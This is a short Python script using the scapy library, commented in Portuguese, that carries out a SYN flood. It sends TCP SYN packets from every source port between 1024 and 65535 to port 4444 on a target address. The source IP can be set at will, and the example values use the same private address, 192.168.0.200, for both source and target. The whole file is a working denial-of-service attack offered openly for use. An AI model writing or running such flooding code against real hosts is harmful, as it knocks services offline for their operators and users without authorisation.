from scapy.all import *

# Função para realizar um ataque de inundação SYN
def flood(src, tgt):
    # Loop através de uma faixa de portas de origem
    for port in range(1024, 65536):
        # Envia um pacote IP com um pacote TCP SYN
        # src: endereço IP de origem
        # dst: endereço IP de destino
        # sport: porta de origem
        # dport: porta de destino (4444)
        # flags: "S" indica um pacote SYN
        send(IP(src=src, dst=tgt)/TCP(sport=port, dport=4444, flags="S"), verbose=False)

# Definindo o endereço IP de origem
source = "192.168.0.200"
# Definindo o endereço IP de destino
target = "192.168.0.200"

# Chamando a função flood com os endereços IP de origem e destino
flood(source, target)
